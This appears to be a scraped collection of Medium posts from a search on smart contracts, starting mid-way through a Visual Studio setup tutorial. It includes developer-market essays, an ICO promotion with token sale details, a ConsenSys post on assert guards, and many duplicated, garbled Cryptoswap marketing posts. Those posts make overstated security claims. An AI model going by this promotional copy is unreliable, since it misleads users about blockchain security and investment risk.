(https://www.visualstudio.com/downloads/)Figure 1.1. Generic Visual Studio downloads site (all editions)Visual Studio Community Edition specific download site (https://www.visualstudio.com/vs/community/).Figure 1.2. Visual Studio Community Edition specific download\u00a0site2. In your Downloads folder, double click on the vs_community.exe installer executable.3. Accept the Visual Studio EULA.Figure 1.3. Accept the Visual Studio\u00a0EULA4. Select the workloads (options) you want to use for your conventional front-end, middle-tier, and back-end components of your solution.Figure 1.4. Visual Studio Installer: Workloads5. IMPORTANT Select the\u00a0.NET Core cross-platform development toolset to enable compilation of all of the NEO developer tools.Figure 1.5. Visual Studio Installer: Toolsets6. Click Modify to complete the installation.7. Installation complete.Figure 1.6. Installation complete8. Test the installation. From the Windows start menu, type \u201cvisual studio\u201d. Select the Visual Studio app from the list. After a short delay, Visual Studio should start and look like something similar to the following.Figure 1.7. Test the installationScenario 2\u200a\u2014\u200aYou have an existing version of Visual Studio 2017 installedIf you have an existing version of Visual Studio 2017 installed, confirm that the required set of workloads and toolsets have been installed.9. Start Visual Studio 2017Figure 1.8. Visual Studio\u00a0201710. In the Visual Studio toolbar, select Tools > Get Tools and Features.... The Visual Studio installer will start.Figure 1.9. Visual Studio Installer11. Proceed to Task 4 (above) in Scenario 1\u200a\u2014\u200aYou don\u2019t have any version of Visual Studio 2017 installed and complete the remaining tasks.Scenario 3\u200a\u2014\u200a(OPTIONAL) Installing and configuring Visual Studio\u00a0Code12. Download the Visual Studio Code installer from either of:Generic Visual Studio downloads site (all editions) (https://www.visualstudio.com/downloads/)Figure 1.10. Generic Visual Studio downloads site (all editions)Visual Studio Code specific download site (https://code.visualstudio.com).Figure 1.11. Visual Studio Code specific download\u00a0site13. In your Downloads folder, double click on the VSCodeSetup-x64-1.20.0.exe installer executable.14. Follow the default installation instructions to completion.15. Test the installation. From the Windows start menu, type \u201cvisual studio code\u201d. Select the Visual Studio Code app from the list.The tasks for this activity are complete. Proceed to Activity 2\u200a\u2014\u200aDownload and unpack NEO developer tool projects (source).References[VSCODE] Microsoft, Microsoft Visual Studio Code web site", "responses": ""}, {"title": "How Smart Contract Developers will get Ranked like Superstar Athletes", "author_name": "Jeremy Epstein", "link": "https://medium.com/@jer979/how-smart-contract-developers-will-get-ranked-like-superstar-athletes-354352234ad8?source=search_post", "post_date": "Mar 7, 2018", "readtime": "2 min read", "upvotes": "1", "content": "How Smart Contract Developers will get Ranked like Superstar AthletesJeremy EpsteinBlockedUnblockFollowFollowingMar 7, 2018TL;DR: Smart Contract developer ratings are going to be a powerful asset in the decentralized economy. The protocol that offers the best platform for reputation management and storage is going to be very valuable.I know I have been on a tear about smart contract developers recently (see here and here). However, when I see a headline that says \u201cMillions of Dollars In Ethereum Are Vulnerable to Hackers Right Now\u201d because 34,200 smart contracts are buggy, I have to pay attention.Pre-crypto, buggy software would result in the loss of time (sites go down) or data (see Equifax).In a crypto-world, buggy software is the equivalent of leaving holes in the wall of your bank or your safe. [ See Parity smart contract bug as one great example.]The world-class smart contract developers of the future (and audit firms like Hoshothat go along with them) not only need to protect against bugs to safeguard the money at risk, they need to protect against miner front-running in order to protect the value of a customer experience.In an excellent article by James Prestwich of Keep called \u201cMiners Aren\u2019t Your Friends,\u201d he eloquently explains how a self-serving miner could rip off money from you or your users.They would do so by examining the code in a smart contract and, if they find a way, injecting their own transaction into the block in front of one that is intended to benefit your customers.According to James, it\u2019s not happening now, but it certainly could\u2026if your smart contract is vulnerable.Which brings me to the conclusion that mirrors what Nadia Eghbal outlined in her post, \u201cThe developer\u2019s dilemma.\u201d In the future, developers won\u2019t charge by output or time as they have done in the past and do today. They will charge by reputation.There will be an ESPN 100-like list of top developers, but instead of some gamified popularity contest, it is going to be more in the line of peer-reviewed type approach. For example:How many pull requests does the developer have on GitHub?How many smart contracts has s/he signed and how long have they been operational?Which other developers has s/he worked with on smart contracts?All of this will be stored in a reputation protocol, secured by a blockchain, signed by digital signatures, and owned by the developer. (This is one reason why I like Kudos Project is because of this need. Disclosure: advisor).As more and more people turn to smart contracts to reduce friction and create value, the people who create the smart contracts will become more and more valuable, since so much will be at risk if you hire the wrong one.Reputation is going to matter. A lot.", "responses": ""}, {"title": "", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/hmm-doubtful-that-iolite-specifically-will-affect-the-demand-of-smart-contract-developers-because-eb994fcc673e?source=search_post", "post_date": "Mar 12, 2018", "readtime": "", "upvotes": "1", "content": "Dave KajpustBlockedUnblockFollowFollowingMar 12, 2018Hmm, doubtful that iolite specifically will affect the demand of smart contract developers, because there are a lot of different companies trying to make different approaches for smart contracts. Right now 95% of smart contracts are in solidity, and on ethereum. So overall, over the next two years, I would guess that it will spread out more to a few other languages (like go) and to a few more platforms. However I believe that smart contract developers will continue to be needed at an increasing pace, but it may be more accessible in that a there are already a lot of people who know go, so it wouldn\u2019t be as hard for them to pick it up.", "responses": "1"}, {"title": "", "author_name": "dev_zl", "link": "https://medium.com/@dev_zl/unless-all-what-you-need-is-a-generic-crowdsale-and-an-erc-20-smart-contract-to-have-your-ico-you-33d0c8dc8559?source=search_post", "post_date": "Apr 10, 2018", "readtime": "", "upvotes": "1", "content": "dev_zlBlockedUnblockFollowFollowingApr 10, 2018Unless all what you need is a generic crowdsale and an ERC-20 smart contract to have your ICO, you could even find the basic contracts on OpenZepplin, and deploy them yourself, or use a platform like MyWish (and I wouldn\u2019t even speak of whether they are trustworthy or not)The thing is if you want to do anything serious and personalized, you\u2019ll need to write the smart contract yourself or hire someone to do so. Past a basic version of a generic use of smart contracts (ERC-20, ERC-721 etc..) the smart contract have to be designed, developed properly, and audited to be as much secure as possible (they deal with money after all)TL;DR: Platforms like MyWish could only generate a basic smart contract, and you\u2019ll have to develop it yourself if you want anything more functional", "responses": ""}, {"title": "Tracking the Emergence of Premium Smart Contract Developer Firms", "author_name": "Jeremy Epstein", "link": "https://medium.com/@jer979/tracking-the-emergence-of-premium-smart-contract-developer-firms-db5a9873526f?source=search_post", "post_date": "Mar 5, 2018", "readtime": "3 min read", "upvotes": "1", "content": "Tracking the Emergence of Premium Smart Contract Developer FirmsJeremy EpsteinBlockedUnblockFollowFollowingMar 5, 2018TL;DR: The race is on to get smart contract development expertise and a new market of providers is emerging.Downstream from all of the crypto currency mania are the people who are focused on leveraging blockchain/DLT to remove intermediaries and unlock value.There are many components to this process, but one of them is picking a blockchain, be it Ethereum, NEM, EOS, QTUM, or others.That is just the first decision, however. From there, you need to develop the smart contract which is the codification of the legal and business rules of the process you want the asset flow to follow.To make that happen, you need (for now) a software developer and, in particular, one that understands how to write smart contracts for a blockchain.The challenge is that there are just not that many people worldwide with those skills. Even worse, having the wrong people write your smart contracts, could put you at risk. According to one report, Millions of Dollars In Ethereum Are Vulnerable to Hackers Right Now.Already in demand, as more and more businesspeople understand the potential of smart contracts, that demand will skyrocket.This will put good devs in a good place and great devs in \u201crock star category.\u201dIt is also going to lead to the emergence of premium, high-end blockchain smart contract consultancies where, thanks to the overwhelming demand, the developers get to pick the best, most exciting, and most intriguing projects on which to work.(BTW, if you want a great article on understanding the motivations of developers in general, take a look at \u2018the developer\u2019s dilemma\u2019 by Nadia Eghbal.)One firm that I believe is on this path is Kyokan. (Disclosure: I\u2019m an advisor to them)Meaning \u201cempathy\u201d in Japanese, Kyokan has already built the world\u2019s first native decentralized app for marketers to deploy tokens to an offline list of ERC-20 compatible addresses.I first came in contact with Daniel Tsui, co-founder of Kyokan on the first Crypto Explorers trip to Zug, Switzerland (aka \u2018Crypto Valley\u2019) in August 2016. From the beginning, he impressed me with his combination of technical knowledge and skill (he wrote the smart contract for the first \u2018proof-of-attendance\u2019 token while he was on the trip, for example).More than that, he displayed a business acumen and a deep understanding of the business implications of blockchain.Smart contract developers who deeply understand the economics and incentives of the activity that their work displaces are going to be in high demand. (This is similar to the need for crypto-marketers to have a better understanding of the capabilities of the technology).Josh Nussbaum had a nice infographic that showed the evolving crypto eco-system. One of the areas to watch are which firms begin to emerge as \u201cpremier\u201d or \u2018luxury\u2019 in building smart contracts based on reputation, ability to future-proof, security (of course) and ability to understand the business context in which the contract is written.", "responses": ""}, {"title": "What is Byteball?\u200a\u2014\u200aREAL Smart Contract Technology at Your Fingertips?\u200a\u2014\u200a#REVIEW", "author_name": "John Saddington", "link": "https://medium.com/@saddington/what-is-byteball-real-smart-contract-technology-at-your-fingertips-review-f4760050b956?source=search_post", "post_date": "Feb 4, 2018", "readtime": "", "upvotes": "", "content": "What is Byteball?\u200a\u2014\u200aREAL Smart Contract Technology at Your Fingertips?\u200a\u2014\u200a#REVIEWJohn SaddingtonBlockedUnblockFollowFollowingFeb 4, 2018What exactly is Byteball? Is this a real game-changer?", "responses": ""}, {"title": "Swap Smart Contract\u00a0Strength", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-smart-contract-strength-367e1dcb719?source=search_post", "post_date": "Oct 15, 2018", "readtime": "3 min read", "upvotes": "", "content": "Swap Smart Contract\u00a0StrengthCryptoswap GlobalBlockedUnblockFollowFollowingOct 15, 2018Smart Contracts on the blockchain are programmable, self-executing digital contracts that facilitate, verify, and execute the terms of a given agreement between users on the blockchain. They are responsible for accessing and storing public, decentralized data of different nature. Because nobody owns or can tamper with that data, everybody can trust it.Independent, autonomousSmart contract is appealing for many reasons. No need to rely on third parties, capital may be biased or not of interest to you. Smart contract is executed exactly the code is set, make sure no errors occurred.The process is done the contract is automatically by. At the same time you create a contract, no longer have to depend on brokers, lawyers or anyone else. As such, it also deletes the risk comes from a third party. The application of Smart Contract can be used in various fields in the future, at present a number of areas have developed smart contract include: Electronic Money, logistics, banking, real estate, even as the election.TrustYour document is encoded on the share ledger and all parties have can have access to them.With organizations such as Government, contract can provide 1 level other transparency for the translation agreement. Decentralized system of transparency for ever\u200a\u2014\u200aCryptoswap Global\u200a\u2014\u200athat you can trust, was built based on our confidence and the trust of the you for us. All your account information, your token balance, each of the transactions taking place on the system are listed a cash clear, clean and transparent.SafeThe document is encrypted, which makes the hackers are almost impossible to check out be. Blockchain will make sure a security for your document. Not a hacker would threaten them.The document was copied many times in 1 Blockchain and does not cover get \u201clost\u201d. Smart contract using the programming languages, code the software to automate the terms, save every hour for the unnecessary work.SpeedSmart order execution contract action, saves precious time your treasure. The automatic contract not only faster and cheaper but also avoid common errors when It only takes a few seconds for all transactions is through. You typically encounter many problems about the speed of transactions on the centralized system or blockchain system obsolete, take too much time to start trading on time and finished products when the transaction successfully. Cryptoswap brought to you a solution to improve all the things that you worry. You have to take up several minutes to hours to sync but when using our product, you take less than a minute to make transactions and get back token directly to address for individuals through smart contract.SaveSmart contracts help you Save a sum of money is charged for intermediaries. Smart contract save you tons of money thanks to remove stitches. Your document is encoded on a general ledger, which means that cannot be lost. With Blockchain, all the ones you have stored your document again. Using Cryptoswap is the smart solution for managing your time and money. With only 1 mouse clicks you can capture everything in hand. Save time, save on transaction costs and confirm the transaction on the system. Optimize your time to the fullest extent.", "responses": ""}, {"title": "Traxion\u200a\u2014\u200aa smart contract\u2013enabled blockchain Traxion!", "author_name": "CryptoWorld_Steemit", "link": "https://medium.com/@CrptWorld/traxion-a-smart-contract-enabled-blockchain-traxion-ec5048dec9d0?source=search_post", "post_date": "Aug 12, 2018", "readtime": "3 min read", "upvotes": "10", "content": "Traxion\u200a\u2014\u200aa smart contract\u2013enabled blockchain Traxion!CryptoWorld_SteemitBlockedUnblockFollowFollowingAug 12, 2018Today I want to introduce you to a campaign like Traxion.The real banking and financial service provision is centralized and causes a lot of questions and complaints from users.The issues of granting loans and lending under such conditions always caused many questions and problems. But the platform for lending and solving financial issues\u200a\u2014\u200aTraXion\u200a\u2014\u200acomes to our aid. TraXion is designed to help consumers and businesses use crypto currency simply and conveniently, like any other currency, in everyday life.TraXion plans to become the best banking in an environment associated with blocking, allowing the community to download, send, save, spend, lend, borrow, and many other functions using its developed application.TraXion launched several products and services to prepare for the exciting event, involving the crowd in the realization of their goal. TraXion plans to have a significant infrastructure before conducting its ICO.To date, TraXion has built the following elements: Payment Platform, Wallet, Personal Finance Platform and Fundraising Platform. These platforms will soon appear on TraxionChain\u200a\u2014\u200alinking people for effective payments, reducing the cost of peer-to-peer lending and remittances using smart contracts.TraXion blockchain strives to deliver data integrity between systems that do not trust each other. This is the main reason why many start-ups are moving towards decentralization, transparency and financial integration. There is a great potential for institutionalization of these technological advances in finance, taking into account the right approach and the appropriate creation of economies of scale within these systems and between them.To achieve their goals, the ICO development team, in order to attract investors for the development of the platform and its further promotion.As you might guess, tokens will be used for all operations, interaction between participants, interaction with the platform and commission payments, and the platform will reward its users for certain actions.Token: TXN(ERC-20)Pre-sale: May 1 2018\u200a\u2014\u200aJuly 30 2018Crowd Sale: August 1 2018\u200a\u2014\u200aAugust 31 2018Token Price: 1 TXN = 0.00035 ETHHard Cap: 45 000 000 USDTraXion will use the ERC20 markers, which are generated by a smart contract on ETH\u2019s blockchain.Details on the stages of the project development can be found from its road map, which is given below:More information on all the information you can find on the project website and in Whitepaper:Website: https://traxion.techWhitepaper: https://traxion.tech/documents/Traxion%20Whitepaper.pdfAlso all news about the project can be learned from the social sites of the project:Telegram: https://t.me/TraxionICOTwitter: https://twitter.com/TraxiontokenFacebook: https://www.facebook.com/traxiontech/ANN Theard https://bitcointalk.org/index.php?topic=3043553.0Bounty Theard: https://bitcointalk.org/index.php?topic=3043752.0Join TraXion. Follow the news on the official information channels.And I was happy to help you today.The bitcointalk profile: https://bitcointalk.org/index.php?action=profile;u=1608822bitcointalk username: maryyny", "responses": ""}, {"title": "Swap Smart Contract\u00a0Strength", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-smart-contract-strength-3c1c40b7becf?source=search_post", "post_date": "Nov 1, 2018", "readtime": "3 min read", "upvotes": "", "content": "Swap Smart Contract\u00a0StrengthCryptoswap GlobalBlockedUnblockFollowFollowingNov 1, 2018Smart Contracts on the blockchain are programmable, self-executing digital contracts that facilitate, verify, and execute the terms of a given agreement between users on the blockchain. They are responsible for accessing and storing public, decentralized data of different nature. Because nobody owns or can tamper with that data, everybody can trust it.Independent, autonomousSmart contract is appealing for many reasons. No need to rely on third parties, capital may be biased or not of interest to you. Smart contract is executed exactly the code is set, make sure no errors occurred.The process is done the contract is automatically by. At the same time you create a contract, no longer have to depend on brokers, lawyers or anyone else. As such, it also deletes the risk comes from a third party. The application of Smart Contract can be used in various fields in the future, at present a number of areas have developed smart contract include: Electronic Money, logistics, banking, real estate, even as the election.TrustYour document is encoded on the share ledger and all parties have can have access to them.With organizations such as Government, contract can provide 1 level other transparency for the translation agreement. Decentralized system of transparency for ever\u200a\u2014\u200aCryptoswap Global\u200a\u2014\u200athat you can trust, was built based on our confidence and the trust of the you for us. All your account information, your token balance, each of the transactions taking place on the system are listed a cash clear, clean and transparent.SafeThe document is encrypted, which makes the hackers are almost impossible to check out be. Blockchain will make sure a security for your document. Not a hacker would threaten them.The document was copied many times in 1 Blockchain and does not cover get \u201clost\u201d. Smart contract using the programming languages, code the software to automate the terms, save every hour for the unnecessary work.SpeedSmart order execution contract action, saves precious time your treasure. The automatic contract not only faster and cheaper but also avoid common errors when It only takes a few seconds for all transactions is through. You typically encounter many problems about the speed of transactions on the centralized system or blockchain system obsolete, take too much time to start trading on time and finished products when the transaction successfully. Cryptoswap brought to you a solution to improve all the things that you worry. You have to take up several minutes to hours to sync but when using our product, you take less than a minute to make transactions and get back token directly to address for individuals through smart contract.SaveSmart contracts help you Save a sum of money is charged for intermediaries. Smart contract save you tons of money thanks to remove stitches. Your document is encoded on a general ledger, which means that cannot be lost. With Blockchain, all the ones you have stored your document again. Using Cryptoswap is the smart solution for managing your time and money. With only 1 mouse clicks you can capture everything in hand. Save time, save on transaction costs and confirm the transaction on the system. Optimize your time to the fullest extent.", "responses": ""}, {"title": "SWAP REFUND SMART\u00a0CONTRACT", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-refund-smart-contract-11c54a2e6d87?source=search_post", "post_date": "Oct 10, 2018", "readtime": "", "upvotes": "", "content": "SWAP REFUND SMART\u00a0CONTRACTCryptoswap GlobalBlockedUnblockFollowFollowingOct 10, 2018The Fund operates based on the Voting feature of Smart Contract, each of the individuals participating in the system Cryptoswap has the right to contribute to the Fund. Through Smart Contract, the user will select a contribution level of freedom that they can. For example, A, B and C have in turn the level of contribution is 5% of the 10% and 15%. During active Fund has extracted half the amount that participants contribute. After that time, if participants Fund have any questions or have the will to want to leave out of the Fund. The system will grant voting for participants, if reached 51%, recalled regarded as adopted. Cryptoswap Fund system will return to you 5% on the remaining amount that you have after their operational funds.Any time of the contributions of all members have the right to vote to be payback, to be Refund.", "responses": ""}, {"title": "What is Swap Smart\u00a0Contract", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/what-is-swap-smart-contract-1e3cefa7d575?source=search_post", "post_date": "Oct 31, 2018", "readtime": "2 min read", "upvotes": "", "content": "What is Swap Smart\u00a0ContractCryptoswap GlobalBlockedUnblockFollowFollowingOct 31, 2018Swap Smart Contract is a computer protocol aims to facilitate digital, to verify or enforce the negotiation or performance of the contract. Smart Contracts allow reliable transactions without a third party. This transaction can be monitored and cannot be reversed.At present there are many technology projects based on blockchain platforms, with strong on technology and the utilities that it brings, but haven\u2019t had any platform really optimized and running smoothly as the cornerstone of public Blockchain most prominent to the map NG smart is Ethereum. Based on the available smart contract is fueled by Ether (known as the Ethereum\u200a\u2014\u200ais a distributed computing platform running on blockchain technology chain blocks, through the use of smart contracts)\u00a0, a token is used to pay for the computational power needed to process them. Smart Contract describes a special protocol has the ability to automatically perform the terms, the agreement between the parties in the contract (in this case is the computer system) thanks to the support of the Blockchain technology. The entire operation of Smart Contract is done automatically and without intervention from outside, or through a third party to mediate. The transaction is made by the Smart Contract, can easily be retrieved and could not be interfered or reversing.The terms in the Smart Contract is equivalent to a legal contract and are recorded under the language of programming. The mechanism of action of Smart Contract can say is like a vending machine. That means they just automatically make these terms has been programming available from before that provision did meet the necessary requirements. After having received the order to deploy, the contract will be implemented as defined terms. At the same time, Smart Contract will also automatically checks the process of implementation of the commitments, the terms outlined in the contract. Simple procedure takes place as follows: Smart contract occurs when Buyers send 5ETH into the system, while the two sides will deal with each of the statements made in the contract conditions (if\u00a0\u2026 then). Smart contracts use code and mathematics to determine the conditions of the contract have been met or not and if met, the money will automatically be moved. And of course the other Person probably will get 5ETH if the contract is made.", "responses": ""}, {"title": "Syed Jafer, Co-Founder/CEO at Karachain\u200a\u2014\u200aOn building India\u2019s First Smart Contract enabled Blockchain", "author_name": "Neil Patel", "link": "https://medium.com/@NeilP666/syed-jafer-co-founder-ceo-at-karachain-on-building-indias-first-smart-contract-enabled-b026d371955?source=search_post", "post_date": "Feb 23, 2018", "readtime": "2 min read", "upvotes": "50", "content": "Syed Jafer, Co-Founder/CEO at Karachain\u200a\u2014\u200aOn building India\u2019s First Smart Contract enabled BlockchainNeil PatelBlockedUnblockFollowFollowingFeb 23, 2018The Indian Startup Show EP:78Blockchain & Bitcoin are here to stay! I chat with Syed Jafar\u200a\u2014\u200aThe Co-founder & CEO at Karachain. They are building a new blockchain that is specifically focussed for developers.So we talk all things blockchain, cryptocurrency, and smart contracts and how they work. Syed talks about the cool products they made.And as we recorded this on Valentines Day we have some chat about love & romance! And now you can listen on Spotify. Just search for the Indian startup show.", "responses": ""}, {"title": "What is Swap Smart Contract\u00a0?", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/what-is-swap-smart-contract-cb3d52ab6ddc?source=search_post", "post_date": "Nov 2, 2018", "readtime": "2 min read", "upvotes": "", "content": "What is Swap Smart Contract\u00a0?Cryptoswap GlobalBlockedUnblockFollowFollowingNov 2, 2018Swap Smart Contract is a computer protocol aims to facilitate digital, to verify or enforce the negotiation or performance of the contract. Smart Contracts allow reliable transactions without a third party. This transaction can be monitored and cannot be reversed.At present there are many technology projects based on blockchain platforms, with strong on technology and the utilities that it brings, but haven\u2019t had any platform really optimized and running smoothly as the cornerstone of public Blockchain most prominent to the map NG smart is Ethereum. Based on the available smart contract is fueled by Ether (known as the Ethereum-is a distributed computing platform running on blockchain technology chain blocks, through the use of smart contracts)\u00a0, a token is used to pay for the computational power needed to process them. Smart Contract describes a special protocol has the ability to automatically perform the terms, the agreement between the parties in the contract (in this case is the computer system) thanks to the support of the Blockchain technology. The entire operation of Smart Contract is done automatically and without intervention from outside, or through a third party to mediate. The transaction is made by the Smart Contract, can easily be retrieved and could not be interfered or reversing. The terms in the Smart Contract is equivalent to a legal contract and are recorded under the language of programming. The mechanism of action of Smart Contract can say is like a vending machine. That means they just automatically make these terms has been programming available from before that provision did meet the necessary requirements. After having received the order to deploy, the contract will be implemented as defined terms. At the same time, Smart Contract will also automatically checks the process of implementation of the commitments, the terms outlined in the contract. Simple procedure takes place as follows: Smart contract occurs when Buyers send 5ETH into the system, while the two sides will deal with each of the statements made in the contract conditions (if\u00a0\u2026 then). Smart contracts use code and mathematics to determine the conditions of the contract have been met or not and if met, the money will automatically be moved. And of course the other Person probably will get 5ETH if the contract is made.", "responses": ""}, {"title": "SWAP REFUND SMART\u00a0CONTRACT", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-refund-smart-contract-aac2d4e46c07?source=search_post", "post_date": "Oct 27, 2018", "readtime": "", "upvotes": "", "content": "SWAP REFUND SMART\u00a0CONTRACTCryptoswap GlobalBlockedUnblockFollowFollowingOct 27, 2018The Fund operates based on the Voting feature of Smart Contract, each of the individuals participating in the system CryptoSwap has the right to contribute to the Fund. Through Smart Contract, the user will select a contribution level of freedom that they can. For example, A, B and C have in turn the level of contribution is 5% of the 10% and 15%. During active Fund has extracted half the amount that participants contribute. After that time, if participants Fund have any questions or have the will to want to leave out of the Fund. The system will grant voting for participants, if reached 51%, recalled regarded as adopted. CryptoSwap Fund system will return to you 5% on the remaining amount that you have after their operational funds.Any time of the contributions of all members have the right to vote to be payback, to be Refund.", "responses": ""}, {"title": "SWAP REFUND SMART\u00a0CONTRACT", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-refund-smart-contract-79b1036fbd4c?source=search_post", "post_date": "Nov 13, 2018", "readtime": "", "upvotes": "", "content": "SWAP REFUND SMART\u00a0CONTRACTCryptoswap GlobalBlockedUnblockFollowFollowingNov 13, 2018The Fund operates based on the Voting feature of Smart Contract, each of the individuals participating in the system CryptoSwap has the right to contribute to the Fund. Through Smart Contract, the user will select a contribution level of freedom that they can. For example, A, B and C have in turn the level of contribution is 5% of the 10% and 15%. During active Fund has extracted half the amount that participants contribute. After that time, if participants Fund have any questions or have the will to want to leave out of the Fund. The system will grant voting for participants, if reached 51%, recalled regarded as adopted. CryptoSwap Fund system will return to you 5% on the remaining amount that you have after their operational funds.Any time of the contributions of all members have the right to vote to be payback, to be Refund.", "responses": ""}, {"title": "What is Swap Smart\u00a0Contract", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/what-is-swap-smart-contract-4cedb8051118?source=search_post", "post_date": "Oct 9, 2018", "readtime": "2 min read", "upvotes": "", "content": "What is Swap Smart\u00a0ContractCryptoswap GlobalBlockedUnblockFollowFollowingOct 9, 2018Swap Smart Contract is a computer protocol aims to facilitate digital, to verify or enforce the negotiation or performance of the contract. Smart Contracts allow reliable transactions without a third party. This transaction can be monitored and cannot be reversed.At present there are many technology projects based on blockchain platforms, with strong on technology and the utilities that it brings, but haven\u2019t had any platform really optimized and running smoothly as the cornerstone of public Blockchain most prominent to the map NG smart is Ethereum. Based on the available smart contract is fueled by Ether (known as the Ethereum\u200a\u2014\u200ais a distributed computing platform running on blockchain technology chain blocks, through the use of smart contracts)\u00a0, a token is used to pay for the computational power needed to process them. Smart Contract describes a special protocol has the ability to automatically perform the terms, the agreement between the parties in the contract (in this case is the computer system) thanks to the support of the Blockchain technology. The entire operation of Smart Contract is done automatically and without intervention from outside, or through a third party to mediate. The transaction is made by the Smart Contract, can easily be retrieved and could not be interfered or reversing.The terms in the Smart Contract is equivalent to a legal contract and are recorded under the language of programming. The mechanism of action of Smart Contract can say is like a vending machine. That means they just automatically make these terms has been programming available from before that provision did meet the necessary requirements. After having received the order to deploy, the contract will be implemented as defined terms. At the same time, Smart Contract will also automatically checks the process of implementation of the commitments, the terms outlined in the contract. Simple procedure takes place as follows: Smart contract occurs when Buyers send 5ETH into the system, while the two sides will deal with each of the statements made in the contract conditions (if\u00a0\u2026 then). Smart contracts use code and mathematics to determine the conditions of the contract have been met or not and if met, the money will automatically be moved. And of course the other Person probably will get 5ETH if the contract is made.", "responses": ""}, {"title": "SWAP REFUND SMART\u00a0CONTRACT", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-refund-smart-contract-3ca315c903fc?source=search_post", "post_date": "Nov 2, 2018", "readtime": "", "upvotes": "", "content": "SWAP REFUND SMART\u00a0CONTRACTCryptoswap GlobalBlockedUnblockFollowFollowingNov 2, 2018The Fund operates based on the Voting feature of Smart Contract, each of the individuals participating in the system CryptoSwap has the right to contribute to the Fund. Through Smart Contract, the user will select a contribution level of freedom that they can. For example, A, B and C have in turn the level of contribution is 5% of the 10% and 15%. During active Fund has extracted half the amount that participants contribute. After that time, if participants Fund have any questions or have the will to want to leave out of the Fund. The system will grant voting for participants, if reached 51%, recalled regarded as adopted. CryptoSwap Fund system will return to you 5% on the remaining amount that you have after their operational funds.Any time of the contributions of all members have the right to vote to be payback, to be Refund.", "responses": ""}, {"title": "SWAP REFUND SMART\u00a0CONTRACT", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-refund-smart-contract-345882ecf48a?source=search_post", "post_date": "Oct 23, 2018", "readtime": "", "upvotes": "", "content": "SWAP REFUND SMART\u00a0CONTRACTCryptoswap GlobalBlockedUnblockFollowFollowingOct 23, 2018The Fund operates based on the Voting feature of Smart Contract, each of the individuals participating in the system Cryptoswap has the right to contribute to the Fund. Through Smart Contract, the user will select a contribution level of freedom that they can. For example, A, B and C have in turn the level of contribution is 5% of the 10% and 15%. During active Fund has extracted half the amount that participants contribute. After that time, if participants Fund have any questions or have the will to want to leave out of the Fund. The system will grant voting for participants, if reached 51%, recalled regarded as adopted. Cryptoswap Fund system will return to you 5% on the remaining amount that you have after their operational funds.Any time of the contributions of all members have the right to vote to be payback, to be Refund.", "responses": ""}, {"title": "", "author_name": "Marc Howard", "link": "https://medium.com/@marcbegins/hi-oscar-ive-enjoyed-your-series-on-explaining-the-concept-of-ai-meets-smart-contract-1fbc56980faf?source=search_post", "post_date": "Nov 22, 2018", "readtime": "", "upvotes": "1", "content": "Marc HowardBlockedUnblockFollowFollowingNov 22, 2018Hi Oscar I\u2019ve enjoyed your series on explaining the concept of AI meets smart contract. I run an open-source community of mostly data scientists and machine learning developers working on crypto predictions. I am exploring ways to incentivize participation in projects and would like to set goals, then automate the reward based whether these goals are achieved (and to what degree, such as partial completion). I\u2019d love your thoughts on whether this could be a good use case for a smart contract?", "responses": ""}, {"title": "Assert Guards: Towards Automated Code Bounties & Safe Smart Contract Coding on\u00a0Ethereum", "author_name": "ConsenSys", "link": "https://media.consensys.net/assert-guards-towards-automated-code-bounties-safe-smart-contract-coding-on-ethereum-87d7434ba802?source=search_post", "post_date": "May 5, 2016", "readtime": "3 min read", "upvotes": "", "content": "Assert Guards: Towards Automated Code Bounties & Safe Smart Contract Coding on\u00a0EthereumConsenSysBlockedUnblockFollowFollowingMay 5, 2016With great power comes great responsibility. Once uploaded, the code on Ethereum runs exactly as programmed\u2026 forever. That is one of the platform\u2019s core benefits: code that always interoperates as promised, can\u2019t be tampered with, and has no down time. You don\u2019t have to trust the creator or hosting, only the code.Except, that comes with a price. As we all know, bugs always creep up. In fact, in Ethereum, there\u2019s already been circumstances where this code, which you can\u2019t replace, has caused trouble.How do you make sure there are no bugs in production, and how do you make sure you retain the trustless powers of Ethereum? One can build code that allows others to change the code. However, this gets us back to square one: needing to trust that the owners of the code haven\u2019t been and won\u2019t be hacked and that they aren\u2019t malevolent.Various members and groups in the community have contributed to finding ways around this [1]. I\u2019ve combined these ideas and some of my own into a concept called \u201cassert guards\u201d.It is code on Ethereum that guards other code. The code can only be changed if a test case\u00a0fails.It works as follows:1) Write your contract tests in Solidity.2) Attached to your primary contract code is other code, called an \u201cassert guard\u201d contract. Attached to it is the tests, as well as the primary code. It has a multi-sig of owners capable of changing the primary contract code.3) If deployed, the owners can\u2019t change the primary contract code.4) If an \u201cassert\u201d fails, then the guard can block all requests to core code & let the multi-sig owners back \u201cin\u201d to be able to change the core contract code (or the tests).5) Once fixed (the code owners have changed the code), the assert guard blocks access to changing the code and opens up requests again. If an assert failure happens again, it repeats the process.6) This can be combined with a relative or fixed lock. Relative == after every fix, if there\u2019s no assert failure after a subsequent 6 months, then the guard ossifies forever, become fully autonomous & trustless. Any new assert failures won\u2019t trigger the guard anymore. A fixed lock is based on the time of deployment. It\u2019s not based on whether assert failures are found. In other words: eg, in 6 months time from deployment, if there was a failure or not, the guard will ossify.In order to incentivize bug hunting, bounties can be used.Automated bounties can be attached upon finding an assert failure. If automation seems unfair or potentially dangerous, it could simply log tx.origin & msg.sender and then pay out a bounty manually afterwards.More democratic ownership of code be done in the form of a DAO: stakeholders must vote on whether or not a fix looks good (instead of say a multi-sig of 3 devs).This means that (1) one can beta-test live code for a few months, (2) developers can fix code in this period if it breaks, (3) you don\u2019t have to be a Solidity expert to deploy functional dApps, and (4) after some time, it moves to the fully trustless power of the Ethereum platform.This method adds additional complexity, as well as additional costs, and merits discussion. If you have any thoughts, please share.by Simon de la Rouviere, Engineer of Societies at ConsenSys.Image credit: https://goo.gl/8praKt[1] Bounties for test case failures & asserts letting developers back in, though I cannot recall where I read this. Please ping me if you have the source.", "responses": ""}, 